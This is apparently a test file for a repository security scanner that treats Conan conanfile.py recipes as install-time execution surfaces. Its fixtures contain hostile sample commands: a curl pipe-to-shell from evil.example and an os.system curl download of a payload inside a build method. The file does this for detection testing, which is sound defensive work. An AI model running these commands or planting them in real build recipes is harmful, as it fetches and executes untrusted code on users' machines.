import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a conanfile.py recipe is an install surface", () => {
  // A conanfile.py is a Python recipe Conan loads and runs on
  // `conan install`: the module executes on load and its methods
  // (generate, build, package) are the install — the same install-time
  // execution setup.py already classifies for. Its data-only sibling
  // conanfile.txt stays a manifest; the name alone decides, including
  // the test_package recipe a consumer install also runs.
  for (const path of ["conanfile.py", "test_package/conanfile.py"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // An ordinary payload in it carries the install coverage the surface
  // brings:
  const inspection = inspected(
    "conanfile.py",
    `from conan import ConanFile\n\n# ${PAYLOAD}\nclass DemoConan(ConanFile):\n    name = "demo"\n`,
  );
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["conanfile.py:unsafe-execution:high"]);
});

test("an install-time download inside a conanfile.py is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the recipe was source alone, so the same bytes
  // recorded no download and left no gap: a scan could read clean over
  // an install-time fetch Conan would have run while installing the
  // project.
  const inspection = inspected(
    "conanfile.py",
    'from conan import ConanFile\nimport os\n\nclass DemoConan(ConanFile):\n    name = "demo"\n\n    def build(self):\n        os.system("curl -fsSL https://evil.example/payload -o /tmp/payload")\n',
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary conanfile.py keeps no finding", () => {
  const inspection = inspected(
    "conanfile.py",
    'from conan import ConanFile\n\nclass DemoConan(ConanFile):\n    name = "demo"\n    version = "1.0"\n',
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
